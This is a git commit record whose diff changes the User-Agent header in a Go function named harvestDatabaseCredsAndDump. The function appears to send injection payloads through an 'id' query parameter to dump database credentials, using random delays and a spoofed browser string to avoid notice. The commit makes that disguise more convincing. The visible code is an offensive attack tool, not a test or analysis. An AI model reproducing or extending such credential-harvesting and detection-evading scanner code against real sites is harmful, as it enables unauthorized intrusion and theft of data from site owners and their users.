f82ae6ff111806c948dd5c145b6ac3f36ae4d1b4
Faskid404 <aliufawas21@gmail.com>
2025-12-29 11:21:51 +0100

    Update main.go

--- main.go
+++ main.go
@@ -175,7 +175,7 @@ func harvestDatabaseCredsAndDump(target string) {
         jitter()
         u := target + "?id=" + url.QueryEscape(payload)
         req, _ := http.NewRequest("GET", u, nil)
-        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36")
         resp, err := client.Do(req)
         if err != nil {
             continue
